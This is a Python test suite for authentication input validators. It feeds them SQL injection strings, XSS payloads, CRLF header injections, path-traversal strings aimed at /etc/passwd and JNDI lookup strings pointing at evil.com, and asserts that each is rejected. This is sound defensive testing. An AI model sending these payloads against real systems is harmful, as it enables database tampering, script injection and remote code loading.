"""
Security-Focused Auth Validators Tests - Input Sanitization & Injection Prevention

Business Value Justification (BVJ):
- Segment: ALL (Free → Enterprise) - INPUT SECURITY CRITICAL
- Business Goal: Prevent injection attacks and input-based security vulnerabilities
- Value Impact: Prevent data breaches, XSS, SQL injection, and other input attacks
- Revenue Impact: Critical - Input vulnerabilities = potential data breaches
- ESTIMATED RISK: -$1M+ potential impact from input security failures

SECURITY FOCUS AREAS:
- SQL injection prevention
- XSS (Cross-Site Scripting) prevention
- Command injection prevention
- Path traversal prevention  
- Unicode normalization attacks
- Input length validation
- Format string attacks
- Template injection prevention
- Log injection prevention
- Header injection prevention

COMPLIANCE:
- 90%+ test coverage for all validation functions
- Zero tolerance for input validation bypasses
- Comprehensive attack vector testing
- Edge case validation for all input types
"""

import re
from datetime import datetime, timedelta, timezone
from typing import Any, Dict, List
from netra_backend.app.websocket_core.unified_manager import UnifiedWebSocketManager
from test_framework.database.test_database_manager import TestDatabaseManager
from auth_service.core.auth_manager import AuthManager
from netra_backend.app.core.agent_registry import AgentRegistry
from netra_backend.app.core.user_execution_engine import UserExecutionEngine
from shared.isolated_environment import IsolatedEnvironment

import pytest
from email_validator import EmailNotValidError

from netra_backend.app.auth_integration.validators import (
    validate_email_format,
    validate_password_strength,
    validate_token_format,
    validate_service_id,
    validate_permission_format,
    validate_session_metadata,
    validate_ip_address,
    validate_user_agent,
    validate_audit_event_type,
    validate_auth_provider,
    validate_token_type,
    validate_expires_at,
    validate_oauth_token,
    validate_error_code,
    validate_endpoint_url,
    validate_cors_origin,
    sanitize_user_input,
    validate_permission_list,
    validate_auth_request_timing,
    create_validation_error,
    AuthValidationError,
    validate_model_field,
)


class TestEmailValidationSecurity:
    """Test email validation security against injection and format attacks"""

    def test_email_format_injection_prevention(self):
        """SECURITY: Test prevention of email-based injection attacks"""
        # SQL injection attempts in email
        sql_injection_emails = [
            "admin@example.com'; DROP TABLE users; --",
            "user@domain.com'; INSERT INTO admin (user) VALUES ('hacker'); --",
            "test@evil.com' UNION SELECT password FROM users WHERE '1'='1",
            "malicious@site.com\"; DROP DATABASE auth; --",
        ]
        
        for email in sql_injection_emails:
            result = validate_email_format(email)
            assert result is False, f"Should reject SQL injection email: {email}"

    def test_email_xss_injection_prevention(self):
        """SECURITY: Test prevention of XSS attacks in email validation"""
        xss_emails = [
            "<script>alert('xss')</script>@domain.com",
            "user@<script>alert(document.cookie)</script>.com",
            "test@domain.com<img src=x onerror=alert(1)>",
            "javascript:alert('xss')@domain.com",
            "&#60;script&#62;alert('xss')&#60;/script&#62;@domain.com",
        ]
        
        for email in xss_emails:
            result = validate_email_format(email)
            assert result is False, f"Should reject XSS email: {email}"

    def test_email_header_injection_prevention(self):
        """SECURITY: Test prevention of email header injection attacks"""
        header_injection_emails = [
            "user@domain.com\r\nBcc: hacker@evil.com",
            "test@example.com\nTo: victim@target.com",
            "admin@site.com%0d%0aBcc: attacker@malicious.com",
            "user@domain.com\r\n\r\nMalicious email body",
        ]
        
        for email in header_injection_emails:
            result = validate_email_format(email)
            assert result is False, f"Should reject header injection email: {email}"

    def test_email_unicode_normalization_attacks(self):
        """SECURITY: Test prevention of Unicode normalization attacks in emails"""
        unicode_attack_emails = [
            "аdmin@example.com",  # Cyrillic 'a' instead of Latin 'a'
            "admin@еxample.com",  # Cyrillic 'e' instead of Latin 'e'
            "test@domain.ⅽom",  # Roman numeral instead of 'c'
            "user@ᵈomain.com",  # Superscript instead of 'd'
        ]
        
        for email in unicode_attack_emails:
            result = validate_email_format(email)
            # Email validator should handle these appropriately
            # Most of these should be rejected as invalid format

    def test_email_length_based_attacks(self):
        """SECURITY: Test prevention of length-based email attacks"""
        # Extremely long email
        long_email = "a" * 1000 + "@example.com"
        result = validate_email_format(long_email)
        # Should be handled by email validator (likely rejected)
        
        # Long domain
        long_domain_email = "user@" + "subdomain." * 100 + "com"
        result = validate_email_format(long_domain_email)
        # Should be handled appropriately

    def test_valid_email_acceptance(self):
        """SECURITY: Ensure valid emails are still accepted"""
        valid_emails = [
            "user@example.com",
            "test.email+tag@domain.co.uk",
            "admin@sub.domain.org",
            "123@numbers.com",
            "a@b.co",
        ]
        
        for email in valid_emails:
            result = validate_email_format(email)
            assert result is True, f"Should accept valid email: {email}"


class TestPasswordValidationSecurity:
    """Test password validation security against various attacks"""

    def test_password_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in passwords"""
        injection_passwords = [
            "'; DROP TABLE users; --",
            "password'; UPDATE users SET is_admin=1 WHERE username='user'; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/}",
            "{{7*7}}",
            "password\r\n\r\nmalicious_header: value",
        ]
        
        for password in injection_passwords:
            result = validate_password_strength(password)
            
            # Even if password contains injection attempts, validation should work
            # But the result should indicate if it meets security requirements
            assert isinstance(result, dict)
            assert "valid" in result
            assert "error" in result
            
            # Most injection attempts will fail other requirements anyway
            if len(password) >= 8 and any(c.isupper() for c in password) and \
               any(c.islower() for c in password) and any(c.isdigit() for c in password):
                assert result["valid"] is True
            else:
                assert result["valid"] is False

    def test_password_length_security_requirements(self):
        """SECURITY: Test password length security enforcement"""
        short_passwords = ["", "a", "ab", "abc", "abcd", "abcde", "abcdef", "abcdefg"]
        
        for password in short_passwords:
            result = validate_password_strength(password)
            assert result["valid"] is False
            assert "too short" in result["error"].lower()

    def test_password_complexity_security_requirements(self):
        """SECURITY: Test password complexity requirements"""
        # Missing uppercase
        result = validate_password_strength("lowercase123")
        assert result["valid"] is False
        assert "uppercase" in result["error"].lower()
        
        # Missing lowercase  
        result = validate_password_strength("UPPERCASE123")
        assert result["valid"] is False
        assert "lowercase" in result["error"].lower()
        
        # Missing number
        result = validate_password_strength("PasswordABC")
        assert result["valid"] is False
        assert "number" in result["error"].lower()

    def test_password_unicode_handling_security(self):
        """SECURITY: Test secure handling of Unicode in passwords"""
        unicode_passwords = [
            "Pássw0rd",  # Accented characters
            "пароль123A",  # Cyrillic
            "密码Password1",  # Chinese characters
            "🔒Secure1Pass",  # Emoji
            "Ñoñó123A",  # Spanish characters
        ]
        
        for password in unicode_passwords:
            result = validate_password_strength(password)
            # Should handle Unicode gracefully
            assert isinstance(result, dict)
            assert "valid" in result

    def test_password_null_byte_injection_prevention(self):
        """SECURITY: Test prevention of null byte injection in passwords"""
        null_byte_passwords = [
            "password\x00admin",
            "Password1\0",
            "Secure\x00\x00Pass1",
            b"Password1\x00".decode('utf-8', errors='ignore'),
        ]
        
        for password in null_byte_passwords:
            result = validate_password_strength(password)
            # Should handle without crashing
            assert isinstance(result, dict)


class TestTokenValidationSecurity:
    """Test token validation security against format attacks"""

    def test_token_format_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in tokens"""
        injection_tokens = [
            "'; DROP TABLE tokens; --",
            "token'; DELETE FROM sessions; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/}",
            "{{constructor.constructor('alert(1)')()}}",
        ]
        
        for token in injection_tokens:
            result = validate_token_format(token)
            assert result is False, f"Should reject injection token: {token}"

    def test_token_format_structure_validation(self):
        """SECURITY: Test JWT token structure validation"""
        # Valid JWT format (3 parts separated by dots)
        valid_jwt = "eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoidGVzdCJ9.signature"
        result = validate_token_format(valid_jwt)
        assert result is True
        
        # Invalid formats
        invalid_tokens = [
            "",  # Empty
            "onlyonepart",  # No dots
            "two.parts",  # Only 2 parts
            "too.many.parts.here",  # Too many parts
            "...",  # Just dots
            ".part1.part2",  # Leading dot
            "part1.part2.",  # Trailing dot
            "part1..part3",  # Double dot
        ]
        
        for token in invalid_tokens:
            result = validate_token_format(token)
            assert result is False, f"Should reject invalid token format: {token}"

    def test_token_length_attack_prevention(self):
        """SECURITY: Test prevention of length-based token attacks"""
        # Extremely short token (should fail length check)
        short_token = "a.b.c"
        result = validate_token_format(short_token)
        assert result is False
        
        # Extremely long token (potential DoS)
        long_part = "a" * 10000
        long_token = f"{long_part}.{long_part}.{long_part}"
        result = validate_token_format(long_token)
        # Should handle without crashing (may accept or reject based on implementation)
        assert isinstance(result, bool)

    def test_token_encoding_attack_prevention(self):
        """SECURITY: Test prevention of encoding-based token attacks"""
        encoding_attack_tokens = [
            "token\x00injection.part2.part3",  # Null byte
            "token\r\nheader.part2.part3",  # CRLF injection
            "token%00injection.part2.part3",  # URL encoded null byte
            "token\xff\xfe.part2.part3",  # BOM characters
            b"invalid\xff\x00bytes.part2.part3".decode('utf-8', errors='ignore'),
        ]
        
        for token in encoding_attack_tokens:
            result = validate_token_format(token)
            assert result is False, f"Should reject encoding attack token: {token}"


class TestServiceIdValidationSecurity:
    """Test service ID validation security"""

    def test_service_id_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in service IDs"""
        injection_service_ids = [
            "service'; DROP TABLE services; --",
            "../../etc/passwd",
            "<script>alert('xss')</script>",
            "service\r\nmalicious_header: value",
            "service${jndi:ldap://evil.com/}",
        ]
        
        for service_id in injection_service_ids:
            result = validate_service_id(service_id)
            assert result is False, f"Should reject injection service ID: {service_id}"

    def test_service_id_format_validation(self):
        """SECURITY: Test service ID format restrictions"""
        # Valid service IDs
        valid_ids = [
            "service-1",
            "auth_service",
            "backend-api",
            "user123",
            "a" * 50,  # Max length
        ]
        
        for service_id in valid_ids:
            result = validate_service_id(service_id)
            assert result is True, f"Should accept valid service ID: {service_id}"
        
        # Invalid formats
        invalid_ids = [
            "",  # Empty
            "ab",  # Too short
            "a" * 51,  # Too long
            "service with spaces",  # Spaces
            "service@domain",  # @ symbol
            "service.with.dots",  # Dots
            "service!",  # Special characters
            "service/path",  # Forward slash
        ]
        
        for service_id in invalid_ids:
            result = validate_service_id(service_id)
            assert result is False, f"Should reject invalid service ID: {service_id}"

    def test_service_id_unicode_attack_prevention(self):
        """SECURITY: Test prevention of Unicode attacks in service IDs"""
        unicode_attack_ids = [
            "sеrvice",  # Cyrillic 'e'
            "servicе",  # Cyrillic 'e' at end
            "ѕervice",  # Cyrillic 's'
            "service\u200b",  # Zero-width space
            "service\ufeff",  # BOM character
        ]
        
        for service_id in unicode_attack_ids:
            result = validate_service_id(service_id)
            assert result is False, f"Should reject Unicode attack service ID: {service_id}"


class TestPermissionValidationSecurity:
    """Test permission validation security"""

    def test_permission_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in permissions"""
        injection_permissions = [
            "read:users'; DROP TABLE permissions; --",
            "admin<script>alert('xss')</script>",
            "permission\r\nmalicious_header: value",
            "read:${jndi:ldap://evil.com/}",
            "../../../admin",
        ]
        
        for permission in injection_permissions:
            result = validate_permission_format(permission)
            assert result is False, f"Should reject injection permission: {permission}"

    def test_permission_format_validation(self):
        """SECURITY: Test permission format restrictions"""
        # Valid permissions
        valid_permissions = [
            "read:data",
            "write:users",
            "admin:manage",
            "api.access",
            "read:user-profile",
            "system_admin",
            "a" * 100,  # Max length
        ]
        
        for permission in valid_permissions:
            result = validate_permission_format(permission)
            assert result is True, f"Should accept valid permission: {permission}"
        
        # Invalid permissions
        invalid_permissions = [
            "",  # Empty
            "a" * 101,  # Too long
            "permission with spaces",  # Spaces
            "read@data",  # @ symbol
            "permission\n",  # Newline
            "permission\t",  # Tab
        ]
        
        for permission in invalid_permissions:
            result = validate_permission_format(permission)
            assert result is False, f"Should reject invalid permission: {permission}"

    def test_permission_list_validation_security(self):
        """SECURITY: Test permission list validation"""
        # Valid permission list
        valid_permissions = ["read:data", "write:comments", "admin:users"]
        result = validate_permission_list(valid_permissions)
        assert result is True
        
        # Invalid inputs
        assert validate_permission_list("not a list") is False
        assert validate_permission_list(None) is False
        assert validate_permission_list([]) is True  # Empty list is valid
        
        # Too many permissions (DoS prevention)
        too_many_permissions = ["perm" + str(i) for i in range(51)]
        result = validate_permission_list(too_many_permissions)
        assert result is False
        
        # List with invalid permission formats
        invalid_list = ["valid:perm", "invalid permission with spaces", "read:data"]
        result = validate_permission_list(invalid_list)
        assert result is False


class TestInputSanitizationSecurity:
    """Test input sanitization security functions"""

    def test_sanitize_user_input_xss_prevention(self):
        """SECURITY: Test XSS prevention in user input sanitization"""
        xss_inputs = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert('xss')",
            "<iframe src=javascript:alert(1)></iframe>",
            "<svg onload=alert(1)>",
            "&#60;script&#62;alert(1)&#60;/script&#62;",
        ]
        
        for xss_input in xss_inputs:
            result = sanitize_user_input(xss_input)
            
            # Should remove dangerous characters
            assert "<" not in result
            assert ">" not in result
            assert '"' not in result
            assert "'" not in result
            assert ";" not in result

    def test_sanitize_user_input_injection_prevention(self):
        """SECURITY: Test injection prevention in user input sanitization"""
        injection_inputs = [
            "'; DROP TABLE users; --",
            '"; DELETE FROM sessions; --',
            "admin'; UPDATE users SET role='admin' WHERE id=1; --",
            "\\'; EXEC xp_cmdshell('dir'); --",
        ]
        
        for injection_input in injection_inputs:
            result = sanitize_user_input(injection_input)
            
            # Should remove dangerous characters
            assert "'" not in result
            assert '"' not in result
            assert ";" not in result
            assert "--" not in result

    def test_sanitize_user_input_length_limits(self):
        """SECURITY: Test length limiting in input sanitization"""
        # Default max length (100 characters)
        long_input = "a" * 200
        result = sanitize_user_input(long_input)
        assert len(result) <= 100
        
        # Custom max length
        custom_max = 50
        result = sanitize_user_input(long_input, max_length=custom_max)
        assert len(result) <= custom_max

    def test_sanitize_user_input_unicode_handling(self):
        """SECURITY: Test Unicode handling in input sanitization"""
        unicode_inputs = [
            "Café",  # Accented characters
            "привет",  # Cyrillic
            "こんにちは",  # Japanese
            "🎉🔒",  # Emoji
            "test\u200b\ufeff",  # Zero-width spaces and BOM
        ]
        
        for unicode_input in unicode_inputs:
            result = sanitize_user_input(unicode_input)
            # Should handle Unicode gracefully
            assert isinstance(result, str)
            assert len(result) <= len(unicode_input)

    def test_sanitize_user_input_edge_cases(self):
        """SECURITY: Test edge cases in input sanitization"""
        edge_cases = [
            "",  # Empty string
            None,  # None input (should be handled)
            " " * 10,  # Only whitespace
            "\n\r\t",  # Control characters
            "\x00\x01\x02",  # Null and control bytes
        ]
        
        for edge_case in edge_cases:
            if edge_case is None:
                result = sanitize_user_input("")
            else:
                result = sanitize_user_input(edge_case)
            
            assert isinstance(result, str)
            # Should strip whitespace
            if edge_case and edge_case.strip():
                assert result == edge_case.strip()
            else:
                assert result == ""


class TestIPAddressValidationSecurity:
    """Test IP address validation security"""

    def test_ip_address_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in IP validation"""
        injection_ips = [
            "192.168.1.1'; DROP TABLE logs; --",
            "127.0.0.1<script>alert('xss')</script>",
            "10.0.0.1\r\nmalicious_header: value",
            "192.168.1.1${jndi:ldap://evil.com/}",
        ]
        
        for ip in injection_ips:
            result = validate_ip_address(ip)
            assert result is False, f"Should reject injection IP: {ip}"

    def test_ipv4_validation_security(self):
        """SECURITY: Test IPv4 validation security"""
        # Valid IPv4 addresses
        valid_ipv4 = [
            "192.168.1.1",
            "127.0.0.1",
            "10.0.0.1",
            "0.0.0.0",
            "255.255.255.255",
        ]
        
        for ip in valid_ipv4:
            result = validate_ip_address(ip)
            assert result is True, f"Should accept valid IPv4: {ip}"
        
        # Invalid IPv4 addresses
        invalid_ipv4 = [
            "256.1.1.1",  # Invalid octet
            "192.168.1.256",  # Invalid octet
            "192.168.1",  # Incomplete
            "192.168.1.1.1",  # Too many octets
            "192.168.01.1",  # Leading zeros (potential bypass)
            "-192.168.1.1",  # Negative
        ]
        
        for ip in invalid_ipv4:
            result = validate_ip_address(ip)
            assert result is False, f"Should reject invalid IPv4: {ip}"

    def test_ipv6_validation_security(self):
        """SECURITY: Test IPv6 validation security"""
        # Valid IPv6 addresses (basic format check)
        valid_ipv6 = [
            "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            "2001:db8:85a3::8a2e:370:7334",
            "::1",
            "fe80::1",
        ]
        
        for ip in valid_ipv6:
            result = validate_ip_address(ip)
            # Basic IPv6 validation (simplified in current implementation)
            assert isinstance(result, bool)

    def test_ip_address_optional_handling(self):
        """SECURITY: Test optional IP address handling"""
        # Empty/None IP should be valid (optional field)
        assert validate_ip_address("") is True
        assert validate_ip_address(None) is True


class TestUserAgentValidationSecurity:
    """Test user agent validation security"""

    def test_user_agent_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in user agent"""
        injection_user_agents = [
            "Mozilla/5.0'; DROP TABLE logs; --",
            "Browser<script>alert('xss')</script>",
            "Agent\r\nmalicious_header: value",
            "Mozilla/5.0 ${jndi:ldap://evil.com/}",
        ]
        
        for ua in injection_user_agents:
            result = validate_user_agent(ua)
            # Current implementation allows any string up to 500 chars
            # Should handle without crashing
            assert isinstance(result, bool)

    def test_user_agent_length_validation(self):
        """SECURITY: Test user agent length validation"""
        # Valid length
        normal_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0"
        result = validate_user_agent(normal_ua)
        assert result is True
        
        # Too long (potential DoS)
        long_ua = "A" * 501
        result = validate_user_agent(long_ua)
        assert result is False
        
        # Empty (optional field)
        result = validate_user_agent("")
        assert result is True
        
        # None (optional field)
        result = validate_user_agent(None)
        assert result is True


class TestURLValidationSecurity:
    """Test URL validation security"""

    def test_endpoint_url_injection_prevention(self):
        """SECURITY: Test prevention of injection attacks in URLs"""
        injection_urls = [
            "https://example.com'; DROP TABLE urls; --",
            "http://evil.com<script>alert('xss')</script>",
            "https://domain.com\r\nmalicious_header: value",
            "http://site.com${jndi:ldap://evil.com/}",
        ]
        
        for url in injection_urls:
            result = validate_endpoint_url(url)
            assert result is False, f"Should reject injection URL: {url}"

    def test_endpoint_url_scheme_validation(self):
        """SECURITY: Test URL scheme validation"""
        # Valid schemes
        valid_urls = [
            "https://api.example.com/auth",
            "http://localhost:8080/health",
            "https://secure-domain.org/endpoint",
        ]
        
        for url in valid_urls:
            result = validate_endpoint_url(url)
            assert result is True, f"Should accept valid URL: {url}"
        
        # Invalid schemes (security risk)
        invalid_urls = [
            "ftp://file.server.com/path",
            "file:///etc/passwd",
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
            "//evil.com/malicious",  # Protocol-relative
            "https://",  # Incomplete
            "",  # Empty
        ]
        
        for url in invalid_urls:
            result = validate_endpoint_url(url)
            assert result is False, f"Should reject invalid URL: {url}"

    def test_cors_origin_validation_security(self):
        """SECURITY: Test CORS origin validation security"""
        # Valid origins
        valid_origins = [
            "*",  # Wildcard
            "https://app.example.com",
            "http://localhost:3000",
            "https://subdomain.domain.org",
            "example.com",  # Domain only
        ]
        
        for origin in valid_origins:
            result = validate_cors_origin(origin)
            assert result is True, f"Should accept valid origin: {origin}"
        
        # Invalid origins
        invalid_origins = [
            "javascript:alert('xss')",
            "data:text/html,<script>alert(1)</script>",
            "file:///etc/passwd",
            "<script>alert(1)</script>",
            "origin\r\nmalicious_header: value",
        ]
        
        for origin in invalid_origins:
            result = validate_cors_origin(origin)
            assert result is False, f"Should reject invalid origin: {origin}"


class TestTimingValidationSecurity:
    """Test timing validation security"""

    def test_auth_request_timing_validation_security(self):
        """SECURITY: Test authentication request timing validation"""
        # Valid timing (within 5 minutes)
        current_time = datetime.now(timezone.utc)
        result = validate_auth_request_timing(current_time)
        assert result is True
        
        # Just within window
        recent_time = current_time - timedelta(minutes=4, seconds=59)
        result = validate_auth_request_timing(recent_time)
        assert result is True
        
        # Outside window (potential replay attack)
        old_time = current_time - timedelta(minutes=10)
        result = validate_auth_request_timing(old_time)
        assert result is False
        
        # Future time (clock skew or manipulation)
        future_time = current_time + timedelta(minutes=10)
        result = validate_auth_request_timing(future_time)
        assert result is False

    def test_expires_at_validation_security(self):
        """SECURITY: Test expiration timestamp validation"""
        current_time = datetime.now(timezone.utc)
        
        # Valid future expiration
        future_expiry = current_time + timedelta(hours=1)
        result = validate_expires_at(future_expiry)
        assert result is True
        
        # Expired (security risk)
        past_expiry = current_time - timedelta(hours=1)
        result = validate_expires_at(past_expiry)
        assert result is False
        
        # Too far in future (potential DoS)
        far_future = current_time + timedelta(days=400)
        result = validate_expires_at(far_future)
        assert result is False
        
        # None/missing expiry
        result = validate_expires_at(None)
        assert result is False


class TestValidationErrorHandlingSecurity:
    """Test validation error handling security"""

    def test_validation_error_information_disclosure_prevention(self):
        """SECURITY: Test prevention of information disclosure in errors"""
        # Create validation error
        error = create_validation_error("email", "Invalid format")
        
        assert error["field"] == "email"
        assert error["message"] == "Invalid format"
        assert error["code"] == "VALIDATION_ERROR"
        assert "timestamp" in error
        
        # Should not contain sensitive information
        assert "password" not in str(error)
        assert "secret" not in str(error)
        assert "key" not in str(error).lower()

    def test_auth_validation_error_security(self):
        """SECURITY: Test AuthValidationError exception security"""
        try:
            raise AuthValidationError("token", "Invalid format", "TOKEN_ERROR")
        except AuthValidationError as e:
            assert e.field == "token"
            assert e.message == "Invalid format"
            assert e.code == "TOKEN_ERROR"
            assert "token: Invalid format" in str(e)
            
            # Should not leak sensitive information
            assert "secret" not in str(e).lower()
            assert "password" not in str(e).lower()

    def test_model_field_validation_security(self):
        """SECURITY: Test model field validation wrapper security"""
        
        def mock_validator(value):
            return len(value) > 5
        
        # Valid value
        result = validate_model_field("valid_value", "test_field", mock_validator)
        assert result == "valid_value"
        
        # Invalid value
        with pytest.raises(AuthValidationError) as exc_info:
            validate_model_field("short", "test_field", mock_validator)
        
        assert exc_info.value.field == "test_field"
        assert "Invalid test_field" in exc_info.value.message
        
        # Validator raises exception
        def failing_validator(value):
            raise ValueError("Custom error")
        
        with pytest.raises(AuthValidationError) as exc_info:
            validate_model_field("test", "test_field", failing_validator)
        
        assert exc_info.value.field == "test_field"
        assert "Custom error" in exc_info.value.message


class TestEnumerationValidationSecurity:
    """Test enumeration validation security"""

    def test_audit_event_type_validation_security(self):
        """SECURITY: Test audit event type validation"""
        # Valid event types
        valid_events = [
            "login", "logout", "token_refresh", "token_validate",
            "password_change", "profile_update", "permission_grant",
            "permission_revoke", "session_create", "session_destroy"
        ]
        
        for event in valid_events:
            result = validate_audit_event_type(event)
            assert result is True, f"Should accept valid event: {event}"
        
        # Invalid event types (potential enumeration attack)
        invalid_events = [
            "admin_login",  # Not in whitelist
            "debug_info",  # Not in whitelist
            "system_info",  # Not in whitelist
            "'; DROP TABLE events; --",  # Injection
            "<script>alert(1)</script>",  # XSS
            "",  # Empty
            None,  # None
        ]
        
        for event in invalid_events:
            if event is None:
                with pytest.raises((TypeError, AttributeError)):
                    validate_audit_event_type(event)
            else:
                result = validate_audit_event_type(event)
                assert result is False, f"Should reject invalid event: {event}"

    def test_auth_provider_validation_security(self):
        """SECURITY: Test auth provider validation"""
        # Valid providers
        valid_providers = ["local", "google", "github", "api_key"]
        
        for provider in valid_providers:
            result = validate_auth_provider(provider)
            assert result is True, f"Should accept valid provider: {provider}"
        
        # Invalid providers
        invalid_providers = [
            "facebook",  # Not supported
            "custom_provider",  # Not supported
            "'; DROP TABLE providers; --",  # Injection
            "",  # Empty
            "GOOGLE",  # Wrong case
        ]
        
        for provider in invalid_providers:
            result = validate_auth_provider(provider)
            assert result is False, f"Should reject invalid provider: {provider}"

    def test_token_type_validation_security(self):
        """SECURITY: Test token type validation"""
        # Valid token types
        valid_types = ["access", "refresh", "service"]
        
        for token_type in valid_types:
            result = validate_token_type(token_type)
            assert result is True, f"Should accept valid token type: {token_type}"
        
        # Invalid token types
        invalid_types = [
            "bearer",  # Not in enum
            "jwt",  # Not in enum  
            "session",  # Not in enum
            "'; DROP TABLE tokens; --",  # Injection
            "",  # Empty
            "ACCESS",  # Wrong case
        ]
        
        for token_type in invalid_types:
            result = validate_token_type(token_type)
            assert result is False, f"Should reject invalid token type: {token_type}"